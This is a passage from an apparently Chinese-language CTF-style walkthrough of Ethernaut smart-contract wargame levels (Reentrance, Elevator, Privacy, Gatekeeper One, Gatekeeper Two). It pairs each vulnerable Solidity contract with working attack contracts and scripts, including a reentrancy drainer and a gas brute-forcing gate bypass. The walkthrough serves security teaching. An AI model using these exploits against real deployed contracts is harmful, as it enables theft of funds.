class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  function donate(address _to) public payable &#123;</span><br><span class="line">    balances[_to] = balances[_to].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _who) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw(uint _amount) public &#123;</span><br><span class="line">    if(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);</span><br><span class="line">      if(result) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Solution-9"><a href="#Solution-9" class="headerlink" title="Solution"></a>Solution</h3><p>代码中使用的这种方式转账<code>msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);</code>会传递所有可用 Gas 进行调用，从而造成重入漏洞。</p>
<p>拿上面的代码简单解释一下重入漏洞就是如果调用<code>withdraw</code>函数向一个合约转账，合约接收Ether会调用<code>receive</code>函数（或者<code>fallback</code>），那么只要在<code>receive</code>中再次调用<code>withdraw</code>，那么合约会再次进行转账并且不会执行到<code>msg.sender.call&#123;value:_amount&#125;(&quot;&quot;)</code>下方更改账户余额的语句<code>balances[msg.sender] -= _amount</code>，图示如下：</p>
<img src="/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/6.png" class="" title="img">



<p>部署以下<code>ReentranceAttack</code>合约（部署时传入1Ether）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.6.2;</span><br><span class="line"></span><br><span class="line">abstract contract Reentrance &#123;</span><br><span class="line">  function donate(address _to) virtual public payable ;</span><br><span class="line">  function withdraw(uint _amount) virtual public ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ReentranceAttack &#123;</span><br><span class="line">  address payable owner;</span><br><span class="line">  Reentrance target;</span><br><span class="line"></span><br><span class="line">  constructor(address payable _target) public payable &#123;</span><br><span class="line">    target = Reentrance(_target);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function attack() public &#123;</span><br><span class="line">    target.donate&#123;value:1 ether&#125;(address(this));</span><br><span class="line">    target.withdraw(1 ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw() public &#123;</span><br><span class="line">    owner.transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    target.withdraw(1 ether);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211209085431565.png" class="" title="image-20211209085431565">

<p>然后调用<code>attack</code>函数，注意<code>GAS </code>要设置大一点，否则重入时会调用失败</p>
<img src="/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211208235728789.png" class="" title="image-20211208235728789">



<p>为了防止重入漏洞，最好采用<a target="_blank" rel="noopener" href="https://docs.soliditylang.org/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern">Checks-Effects-Interactions</a>模式，即先检查，然后更改合约状态变量，最后才与其他合约交互。</p>
<h2 id="Elevator"><a href="#Elevator" class="headerlink" title="Elevator"></a>Elevator</h2><p>This elevator won’t let you reach the top of your building. Right?</p>
<p> Things that might help:</p>
<ul>
<li>Sometimes solidity is not good at keeping promises.</li>
<li>This <code>Elevator</code> expects to be used from a <code>Building</code>.</li>
</ul>
<h3 id="Sources-10"><a href="#Sources-10" class="headerlink" title="Sources"></a>Sources</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">  function isLastFloor(uint) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Elevator &#123;</span><br><span class="line">  bool public top;</span><br><span class="line">  uint public floor;</span><br><span class="line"></span><br><span class="line">  function goTo(uint _floor) public &#123;</span><br><span class="line">    Building building = Building(msg.sender);</span><br><span class="line"></span><br><span class="line">    if (! building.isLastFloor(_floor)) &#123;</span><br><span class="line">      floor = _floor;</span><br><span class="line">      top = building.isLastFloor(floor);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Solution-10"><a href="#Solution-10" class="headerlink" title="Solution"></a>Solution</h3><p>要求是使<code>top</code>为<code>true</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.2;</span><br><span class="line"></span><br><span class="line">abstract contract Elevator &#123;</span><br><span class="line">  function goTo(uint _floor) virtual public;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">  function isLastFloor(uint) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ElevatorAttack is Building&#123;</span><br><span class="line">  bool public isLast = true;</span><br><span class="line">  </span><br><span class="line">  function isLastFloor(uint) override external returns (bool) &#123;</span><br><span class="line">    isLast = ! isLast;</span><br><span class="line">    return isLast;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function attack(address _victim) public &#123;</span><br><span class="line">    Elevator elevator = Elevator(_victim);</span><br><span class="line">    elevator.goTo(10);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这道题目原来是<code>function isLastFloor(uint) view public returns (bool);</code>考点是<code>Solidity</code> 编译器没有强制执行 <code>view</code> 函数不能修改状态</p>
<h2 id="Privacy"><a href="#Privacy" class="headerlink" title="Privacy"></a>Privacy</h2><p>The creator of this contract was careful enough to protect the sensitive areas of its storage.</p>
<p>Unlock this contract to beat the level.</p>
<p>Things that might help:</p>
<ul>
<li>Understanding how storage works</li>
<li>Understanding how parameter parsing works</li>
<li>Understanding how casting works</li>
</ul>
<p>Tips:</p>
<ul>
<li>Remember that metamask is just a commodity. Use another tool if it is presenting problems. Advanced gameplay could involve using remix, or your own web3 provider.</li>
</ul>
<h3 id="Sources-11"><a href="#Sources-11" class="headerlink" title="Sources"></a>Sources</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Privacy &#123;</span><br><span class="line"></span><br><span class="line">  bool public locked = true;</span><br><span class="line">  uint256 public ID = block.timestamp;</span><br><span class="line">  uint8 private flattening = 10;</span><br><span class="line">  uint8 private denomination = 255;</span><br><span class="line">  uint16 private awkwardness = uint16(now);</span><br><span class="line">  bytes32[3] private data;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32[3] memory _data) public &#123;</span><br><span class="line">    data = _data;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function unlock(bytes16 _key) public &#123;</span><br><span class="line">    require(_key == bytes16(data[2]));</span><br><span class="line">    locked = false;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /*</span><br><span class="line">    A bunch of super advanced solidity algorithms...</span><br><span class="line"></span><br><span class="line">      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`</span><br><span class="line">      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,</span><br><span class="line">      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\</span><br><span class="line">      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)</span><br><span class="line">      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU</span><br><span class="line">  */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Solution-11"><a href="#Solution-11" class="headerlink" title="Solution"></a>Solution</h3><p><code>EVM</code> 虚拟机是一个256位的机器，所以它的一个存储位是 <code>32</code> 个字节，常量不存储，仅在代码中可用。当变量所占空间小于 <code>32</code> 字节且如果加上后面的变量也不超过 <code>32</code> 字节的话，则会与后面的变量共享空间。</p>
<p><a target="_blank" rel="noopener" href="https://medium.com/aigang-network/how-to-read-ethereum-contract-storage-44252c8af925">How to read Ethereum contract storage</a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bool public locked = <span class="literal">true</span>;								<span class="comment">// 1字节</span></span><br><span class="line">uint256 public <span class="variable constant_">ID</span> = block.<span class="property">timestamp</span>;			<span class="comment">// 32字节</span></span><br><span class="line">uint8 private flattening = <span class="number">10</span>;						<span class="comment">// 1字节</span></span><br><span class="line">uint8 private denomination = <span class="number">255</span>;					<span class="comment">// 1字节</span></span><br><span class="line">uint16 private awkwardness = <span class="title function_">uint16</span>(now);	<span class="comment">// 2字节</span></span><br><span class="line">bytes32[<span class="number">3</span>] private data;									<span class="comment">// 32*3字节</span></span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance, <span class="number">0</span> ,<span class="keyword">function</span>(<span class="params">err,res</span>)&#123;<span class="variable language_">console</span>.<span class="title function_">info</span>(res)&#125;)</span><br><span class="line"><span class="comment">//0x0000000000000000000000000000000000000000000000000000000000000001</span></span><br><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance, <span class="number">1</span> ,<span class="keyword">function</span>(<span class="params">err,res</span>)&#123;<span class="variable language_">console</span>.<span class="title function_">info</span>(res)&#125;)</span><br><span class="line"><span class="comment">//0x0000000000000000000000000000000000000000000000000000000061b41d10</span></span><br><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance, <span class="number">2</span> ,<span class="keyword">function</span>(<span class="params">err,res</span>)&#123;<span class="variable language_">console</span>.<span class="title function_">info</span>(res)&#125;)</span><br><span class="line"><span class="comment">//0x000000000000000000000000000000000000000000000000000000001d10ff0a</span></span><br><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance, <span class="number">3</span> ,<span class="keyword">function</span>(<span class="params">err,res</span>)&#123;<span class="variable language_">console</span>.<span class="title function_">info</span>(res)&#125;)</span><br><span class="line"><span class="comment">//0x044d379b78a8d339346bbe58117dfbf39f31c4b26b7aea6414e01c1a5aa0a3cd</span></span><br><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance, <span class="number">4</span> ,<span class="keyword">function</span>(<span class="params">err,res</span>)&#123;<span class="variable language_">console</span>.<span class="title function_">info</span>(res)&#125;)</span><br><span class="line"><span class="comment">//0x5e9b0400a5a6b65012c151e1142cc934df2444db82348cb7a96df88e1a03aee8</span></span><br><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance, <span class="number">5</span> ,<span class="keyword">function</span>(<span class="params">err,res</span>)&#123;<span class="variable language_">console</span>.<span class="title function_">info</span>(res)&#125;)</span><br><span class="line"><span class="comment">//0xdafa095e2a73eadf05b9ba9325c859ec1a3263470c07f5f16f62e7f30a9ee794</span></span><br><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance, <span class="number">6</span> ,<span class="keyword">function</span>(<span class="params">err,res</span>)&#123;<span class="variable language_">console</span>.<span class="title function_">info</span>(res)&#125;)</span><br><span class="line"><span class="comment">//0x0000000000000000000000000000000000000000000000000000000000000000</span></span><br></pre></td></tr></table></figure>

<p>所以<code>data[2]</code>是<code>web3.eth.getStorageAt(instance, 5 ,function(err,res)&#123;console.info(res)&#125;)</code>的结果, <code>bytes16()</code> 其实就是切片，取前 <code>16</code> 个 字节。</p>
<p><code>contract.unlock(&quot;0xdafa095e2a73eadf05b9ba9325c859ec1a3263470c07f5f16f62e7f30a9ee794&quot;.substring(0,34))</code></p>
<h2 id="Gatekeeper-One"><a href="#Gatekeeper-One" class="headerlink" title="Gatekeeper One"></a>Gatekeeper One</h2><p>Make it past the gatekeeper and register as an entrant to pass this level.</p>
<p>Things that might help:</p>
<ul>
<li>Remember what you’ve learned from the Telephone and Token levels.</li>
<li>You can learn more about the special function <code>gasleft()</code>, in Solidity’s documentation (see <a target="_blank" rel="noopener" href="https://docs.soliditylang.org/en/v0.8.3/units-and-global-variables.html">here</a> and <a target="_blank" rel="noopener" href="https://docs.soliditylang.org/en/v0.8.3/control-structures.html#external-function-calls">here</a>).</li>
</ul>
<h3 id="Sources-12"><a href="#Sources-12" class="headerlink" title="Sources"></a>Sources</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    require(gasleft().mod(8191) == 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) == uint16(tx.origin), &quot;GatekeeperOne: invalid gateThree part three&quot;);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Solution-12"><a href="#Solution-12" class="headerlink" title="Solution"></a>Solution</h3><p>需要满足3个<code>modifier</code></p>
<ul>
<li><p><code>gateOne()</code></p>
<p>同<a href="./#Telephone">Telephone</a></p>
</li>
<li><p><code>gateTwo()</code></p>
<p>在Remix的Javascript VM环境下部署<code>GatekeeperOneAttack</code>然后进入调试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    require(gasleft() % 8191 == 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) == uint16(tx.origin), &quot;GatekeeperOne: invalid gateThree part three&quot;);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOneAttack &#123;</span><br><span class="line"></span><br><span class="line">  constructor(address GatekeeperOneContractAddress) public &#123;</span><br><span class="line">    bytes memory encodedParams = abi.encodeWithSignature((&quot;enter(bytes8)&quot;),</span><br><span class="line">      0x0000000000000000</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    address(GatekeeperOneContractAddress).call&#123;gas: 81910&#125;(encodedParams);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2021/12/02/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211211214345867.png" class="" title="image-20211211214345867">

<p>调用<code>enter</code>函数时传入了81910 gas，到执行<code>gasleft()</code>函数前还剩81661 gas，<code>gasleft()</code>函数本身消耗2 gas，所以我们应该传入的gas为<code>n*8191+(81910-81661+2)</code></p>
</li>
<li><p><code>gateThree(bytes8 _gateKey)</code></p>
<ul>
<li><p><code>uint32(uint64(_gateKey)) == uint16(tx.origin)</code></p>
<p>让<code>_gateKey</code>等于<code>bytes8(uint64(tx.origin))&amp;0xFFFFFFFFFF00FFFF</code>即可</p>
</li>
<li><p><code>uint32(uint64(_gateKey)) != uint64(_gateKey)</code></p>
<p><code>_gateKey</code>前4个字节不为0即可，可以<code>|0xFFFFFFFF00000000</code>来确保</p>
</li>
<li><p><code>uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)</code></p>
<p>继续<code>&amp;0xFFFFFFFF00FFFFFF</code></p>
</li>
</ul>
</li>
</ul>
<p>综上<code>_gateKey = bytes8(uint64(tx.origin)) &amp; 0xFFFFFFFF0000FFFF | 0xFFFFFFFF00000000;</code>    </p>
<p>设置好的gas在实际测试网中没成功，所以还是采用以下方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOneAttack &#123;</span><br><span class="line"></span><br><span class="line">  constructor(address GatekeeperOneContractAddress) public &#123;</span><br><span class="line">    bytes8 _gateKey = bytes8(uint64(tx.origin)) &amp; 0xFFFFFFFF0000FFFF | 0xFFFFFFFF00000000;</span><br><span class="line">    </span><br><span class="line">    // NOTE: the proper gas offset to use will vary depending on the compiler</span><br><span class="line">    // version and optimization settings used to deploy the factory contract.</span><br><span class="line">    // To migitage, brute-force a range of possible values of gas to forward.</span><br><span class="line">    // Using call (vs. an abstract interface) prevents reverts from propagating.</span><br><span class="line">    bytes memory encodedParams = abi.encodeWithSignature((&quot;enter(bytes8)&quot;),</span><br><span class="line">      _gateKey</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">		// gas offset usually comes in around 210, give a buffer of 60 on each side</span><br><span class="line">    for (uint256 i = 0; i &lt; 120; i++) &#123;</span><br><span class="line">      (bool result, ) = address(GatekeeperOneContractAddress).call&#123;gas: i + 150 + 8191 * 3&#125;(encodedParams);</span><br><span class="line">      if(result)</span><br><span class="line">        &#123;</span><br><span class="line">        break;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Gatekeeper-Two"><a href="#Gatekeeper-Two" class="headerlink" title="Gatekeeper Two"></a>Gatekeeper Two</h2><p>This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.</p>
<p>Things that might help:</p>
<ul>
<li>Remember what you’ve learned from getting past the first gatekeeper - the first gate is the same.</li>
<li>The <code>assembly</code> keyword in the second gate allows a contract to access functionality that is not native to vanilla Solidity. See <a target="_blank" rel="noopener" href="http://solidity.readthedocs.io/en/v0.4.23/assembly.html">here</a> for more information. The <code>extcodesize</code> call in this gate will get the size of a contract’s code at a given address - you can learn more about how and when this is set in section 7 of the <a target="_blank" rel="noopener" href="https://ethereum.github.io/yellowpaper/paper.pdf">yellow paper</a>.</li>
<li>The <code>^</code> character in the third gate is a bitwise operation (XOR), and is used here to apply another common bitwise operation (see <a target="_blank" rel="noopener" href="http://solidity.readthedocs.io/en/v0.4.23/miscellaneous.html#cheatsheet">here</a>). The Coin Flip level is also a good place to start when approaching this challenge.</li>
</ul>
<h3 id="Sources-13"><a href="#Sources-13" class="headerlink" title="Sources"></a>Sources</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    uint x;</span><br><span class="line">    assembly &#123; x := extcodesize(caller()) &#125;</span><br><span class="line">    require(x == 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Solution-13"><a href="#Solution-13" class="headerlink" title="Solution"></a>Solution</h3><ul>
<li><p><code>gateThree(bytes8 _gateKey)</code></p>
<p><code>bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(-1));</code></p>
</li>
<li><p><code>gateTwo()</code></p>
<p>参考<a target="_blank" rel="noopener" href="https://ethereum.github.io/yellowpaper/paper.pdf">yellow paper</a> 7.1</p>
<blockquote>
